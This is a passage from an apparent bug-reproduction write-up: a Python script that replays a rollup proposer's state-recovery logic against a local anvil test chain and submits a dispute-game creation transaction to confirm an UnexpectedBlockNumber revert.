        bytes32 l1OriginHash = blockhash(block.number - 1);
        uint256 l1OriginNumber = block.number - 1;
        bytes memory signature = abi.encodePacked(salt, bytes32(0), bytes32(0), uint8(27));
        return abi.encodePacked(uint8(0), l1OriginHash, l1OriginNumber, signature);
    }
}
```

## code for run\_recover\_against\_live.py

```python
#!/usr/bin/env python3
"""
Replicates the production proposer's recover_latest_state +
forward_walk + validate_and_submit logic line-by-line against the
live anvil chain in the broken-anchor state. Each step is annotated
with the corresponding source line in
crates/proof/proposer/src/pipeline.rs.

Run on the VM:
    python3 run_recover_against_live.py

It will print the RecoveredState the production code returns (broken)
and submit the resulting createWithInitData tx, capturing the
UnexpectedBlockNumber revert.
"""

import json
import subprocess
import sys

RPC = "http://localhost:8545"
KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

# Addresses as deployed by phase A on the live anvil.
ASR     = "0x5FC8d32690cc91D4c39d9d3abcBD16989F875707"  # AnchorStateRegistry proxy
DGF     = "0x0165878A594ca255338adfa4d48449f69242Eb8F"  # DisputeGameFactory proxy
G1      = "0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B"  # First (OG-rooted) game

GAME_TYPE = 621
BLOCK_INTERVAL = 100
INTERMEDIATE_BLOCK_INTERVAL = 10
INIT_BOND_WEI = 10**18  # 1 ether

def call(args, value_in=False):
    """Run cast and return stripped stdout, dying on error."""
    r = subprocess.run(args, capture_output=True, text=True)
    if r.returncode != 0 and not value_in:
        sys.stderr.write(f"cast failed: {' '.join(args)}\n{r.stderr}\n")
        sys.exit(1)
    return r.stdout.strip(), r.returncode, r.stderr

def hex_to_int(s):
    return int(s, 16) if s.startswith("0x") else int(s)

print("=" * 70)
print("F1: end-to-end recovery code path executed against live L1 anvil")
print("=" * 70)

# ----------------------------------------------------------------------
# Step 1. recover_latest_state() reads gameCount() and getAnchorRoot()
#         (pipeline.rs:717-728). Print both.
# ----------------------------------------------------------------------
print("\n[step 1] recover_latest_state reads gameCount + anchor")
print("         (pipeline.rs:717-728)")

count_out, _, _ = call(["cast", "call", DGF, "gameCount()(uint256)", "--rpc-url", RPC])
game_count = int(count_out.strip())
print(f"         gameCount             = {game_count}")

anchor_out, _, _ = call(["cast", "call", ASR, "getAnchorRoot()(bytes32,uint256)", "--rpc-url", RPC])
anchor_lines = anchor_out.split("\n")
anchor_root = anchor_lines[0].strip()
anchor_block = int(anchor_lines[1].strip())
print(f"         anchor.root           = {anchor_root}")
print(f"         anchor.l2_block       = {anchor_block}")

start_out, _, _ = call(["cast", "call", ASR, "getStartingAnchorRoot()(bytes32,uint256)", "--rpc-url", RPC])
start_lines = start_out.split("\n")
start_root = start_lines[0].strip()
start_block = int(start_lines[1].strip())
print(f"         starting.root         = {start_root}     (immutable OG)")
print(f"         starting.l2_block     = {start_block}                                                                       (immutable OG)")

if start_block == anchor_block:
    print("\n         FYI: startingAnchorRoot.l2 == getAnchorRoot.l2 -- the bug")
    print("         is dormant in this state. Need to call closeGame() first.")
    sys.exit(2)

print(f"\n         => anchor has advanced past OG ({anchor_block} > {start_block}).")
print(f"            F1 trigger condition is satisfied.")

# ----------------------------------------------------------------------
# Step 2. cache miss -> seed RecoveredState with parent=ASR, l2=anchor
#         (pipeline.rs:766-771)
# ----------------------------------------------------------------------
print("\n[step 2] cache miss => seed RecoveredState")
print("         (pipeline.rs:766-771)")
seeded_parent = ASR
seeded_l2     = anchor_block
seeded_root   = anchor_root
print(f"         seeded parent_address = {seeded_parent}  (= ASR)")
print(f"         seeded l2_block       = {seeded_l2}")
print(f"         seeded output_root    = {seeded_root}")

# ----------------------------------------------------------------------
# Step 3. forward_walk first iteration:
#         expected_block = seeded_l2 + BLOCK_INTERVAL
#         (pipeline.rs:816)
# ----------------------------------------------------------------------
print("\n[step 3] forward_walk first iteration")
print("         (pipeline.rs:816)")
expected_block = seeded_l2 + BLOCK_INTERVAL
print(f"         expected_block = {seeded_l2} + {BLOCK_INTERVAL} = {expected_block}")

# ----------------------------------------------------------------------
# Step 4. Build extraData per encode_extra_data
#         (dispute_game_factory.rs:177-189)
#         Format: l2BlockNumber(32) || parentAddress(20) || intermediates(32*N)
# ----------------------------------------------------------------------
print("\n[step 4] build extraData = l2BlockNumber(32) ‖ parentAddress(20) ‖ intermediates(32*N)")
print("         (dispute_game_factory.rs:177-189)")

# Intermediate roots: keccak256(abi.encode(uint256(starting + i*INTER))) for i=1..N-1,
# and the rootClaim itself for the final intermediate.
# Per the F1LivePhase.sol _extraData helper.
N = BLOCK_INTERVAL // INTERMEDIATE_BLOCK_INTERVAL
starting_l2 = expected_block - BLOCK_INTERVAL

intermediates = b""
for i in range(1, N):
    block_i = starting_l2 + INTERMEDIATE_BLOCK_INTERVAL * i
    # cast keccak (abi.encode(uint256)) i.e. just the 32-byte big-endian repr
    h_out, _, _ = call(["cast", "keccak", "0x" + block_i.to_bytes(32, "big").hex()])
    intermediates += bytes.fromhex(h_out[2:])

# The last intermediate is the canonical root at expected_block.
# This is the rootClaim itself = keccak256(abi.encode(uint256(expected_block))).
root_claim_out, _, _ = call(["cast", "keccak", "0x" + expected_block.to_bytes(32, "big").hex()])
root_claim = root_claim_out
intermediates += bytes.fromhex(root_claim[2:])

extra_data  = expected_block.to_bytes(32, "big")
extra_data += bytes.fromhex(seeded_parent[2:])  # 20-byte address
extra_data += intermediates
extra_data_hex = "0x" + extra_data.hex()
print(f"         expected_block        = {expected_block}")
print(f"         parent_address        = {seeded_parent}")
print(f"         intermediate_roots[N] = {N} roots")
print(f"         rootClaim (final)     = {root_claim}")
print(f"         extraData length      = {len(extra_data)} bytes (= 52 + 32*{N})")

# ----------------------------------------------------------------------
# Step 5. factory.games(GAME_TYPE, rootClaim, extraData) lookup
#         (pipeline.rs:870-880)
# ----------------------------------------------------------------------
print("\n[step 5] factory.games(GAME_TYPE, rootClaim, extraData) UUID lookup")
print("         (pipeline.rs:870-880)")
games_out, _, _ = call([
    "cast", "call", DGF,
    "games(uint32,bytes32,bytes)(address,uint64)",
    str(GAME_TYPE), root_claim, extra_data_hex,
    "--rpc-url", RPC,
])
games_lines = games_out.split("\n")
games_proxy = games_lines[0].strip()
print(f"         lookup result         = {games_proxy}")
if games_proxy.lower() == "0x0000000000000000000000000000000000000000":
    print("         => Address::ZERO -- walk breaks at first iteration (pipeline.rs:882-891)")
else:
    print(f"         => UNEXPECTED: walk would continue with this proxy")

# ----------------------------------------------------------------------
# Step 6. forward_walk returns RecoveredState{parent=ASR, l2_block=anchor}
#         (pipeline.rs:916-920)
# ----------------------------------------------------------------------
print("\n[step 6] forward_walk returns the broken state")
print("         (pipeline.rs:916-920)")
print(f"         RecoveredState {{")
print(f"           parent_address: {seeded_parent},   <-- ASR (the broken seed)")
print(f"           output_root:    {seeded_root},")
print(f"           l2_block_number: {seeded_l2},")
print(f"         }}")

# ----------------------------------------------------------------------
# Step 7. dispatch_proofs sets cursor = recovered.l2 + BI = expected_block
#         (pipeline.rs:337-346). validate_and_submit calls
#         output_proposer.propose_output(proposal, parent=ASR, intermediates).
#         (pipeline.rs:1170-1175). ProposalSubmitter then calls
#         factory.createWithInitData(GAME_TYPE, root, extraData, proofData).
#         (output_proposer.rs:103-147)
# ----------------------------------------------------------------------
print("\n[step 7] validate_and_submit -> output_proposer.propose_output")
print("         (pipeline.rs:1170-1175 -> output_proposer.rs:103-147)")
print("         => factory.createWithInitData(...) submitted with parent=ASR")

# Build proof_data per ProofEncoder::encode_proof_bytes:
#   proofType(1) || l1OriginHash(32) || l1OriginNumber(32) || signature(65) = 130 bytes.
latest_block_out, _, _ = call([
    "cast", "block", "latest", "--rpc-url", RPC, "--json"
])
latest_block_json = json.loads(latest_block_out)
l1_block_hash = latest_block_json["hash"]
l1_block_num  = hex_to_int(latest_block_json["number"]) - 1

# Get blockhash(l1_block_num) by querying the parent block
prev_block_out, _, _ = call([
    "cast", "block", str(l1_block_num), "--rpc-url", RPC, "--json"
])
prev_block_json = json.loads(prev_block_out)
l1_origin_hash = prev_block_json["hash"]

proof_type   = bytes([0])  # TEE
l1_origin_h  = bytes.fromhex(l1_origin_hash[2:])
l1_origin_n  = l1_block_num.to_bytes(32, "big")
signature    = b"\x00" * 64 + bytes([27])  # dummy sig + v (MockVerifier returns true)
proof_data   = proof_type + l1_origin_h + l1_origin_n + signature
proof_hex    = "0x" + proof_data.hex()
print(f"         proof_data length     = {len(proof_data)} bytes (= 1 + 32 + 32 + 65)")
print(f"         l1_origin_hash        = {l1_origin_hash}")
print(f"         l1_origin_number      = {l1_block_num}")

# ----------------------------------------------------------------------
# Step 8. Submit via cast send -- this is the EXACT tx the production
#         proposer would put on the wire. Capture the revert.
# ----------------------------------------------------------------------
print("\n[step 8] LIVE SUBMISSION: cast send factory.createWithInitData(...)")
print("         this is the tx the production binary would submit")

create_call = ["cast", "send", DGF,
    "createWithInitData(uint32,bytes32,bytes,bytes)",
    str(GAME_TYPE), root_claim, extra_data_hex, proof_hex,
    "--value", str(INIT_BOND_WEI) + "wei",
    "--rpc-url", RPC,
    "--private-key", KEY,
]
out, rc, err = call(create_call, value_in=True)
print(f"\n         exit code             = {rc}")
print(f"         stdout                = {out!r}"[:200])
print(f"         stderr (head):")
for line in err.splitlines()[:6]:
    print(f"           {line}")

if "0x087b2d76" in (err + out):
    print("\n[step 9] CONFIRMED: revert data contains UnexpectedBlockNumber selector 0x087b2d76")
    # Decode the args
    # typically err contains: 'execution reverted: 0x087b2d76...0064...00c8'
    import re
    m = re.search(r"0x087b2d76([0-9a-fA-F]{64})([0-9a-fA-F]{64})", err + out)
    if m:
        expected = int(m.group(1), 16)
        actual   = int(m.group(2), 16)
        print(f"         UnexpectedBlockNumber.expected = {expected}")
        print(f"         UnexpectedBlockNumber.actual   = {actual}")
        if expected == BLOCK_INTERVAL and actual == 2 * BLOCK_INTERVAL:
            print("         => matches F1 prediction exactly (expected=BI, actual=2*BI)")
elif rc == 0:
    print("\n[step 9] UNEXPECTED: tx succeeded -- F1 NOT REPRODUCED")
else:
    print("\n[step 9] tx reverted but selector was not 0x087b2d76:")
    for line in err.splitlines()[:15]:
        print(f"           {line}")
```
